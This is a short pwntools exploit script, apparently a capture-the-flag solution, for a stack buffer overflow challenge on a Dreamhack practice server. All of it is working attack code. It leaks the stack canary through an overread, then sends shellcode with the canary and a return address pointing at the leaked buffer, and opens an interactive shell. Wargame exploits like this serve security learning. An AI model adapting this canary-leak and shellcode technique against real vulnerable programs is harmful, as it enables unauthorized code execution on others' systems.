from pwn import *
context.arch='amd64' #server architecture
context.log_level='debug' #set debug mode

# server connection
p=remote("host3.dreamhack.games",21919)

# get the address of buf
p.recvuntil(b"Address of the buf: ")
bufAddr=int(p.recv(14),16)

# get the canary value using stack buffer overflow
p.recvuntil(b"Input: ")
payload=b'a'*0x59 # 0x59 = 0x58(buf size) + 0x1(canary's first byte(NULL)), to avoid meet null byte(can't read canary)
p.send(payload)
p.recvuntil(payload)
canary=u64(b'\x00'+p.recvn(7)) # canary

#shell code with canary to cause stack buffer overflow
sh = asm(shellcraft.sh())
payload = sh.ljust(0x58, b'A') + p64(canary) + b'B'*0x8 + p64(bufAddr)
p.recvuntil(b"Input: ")
p.sendline(payload)

p.interactive()

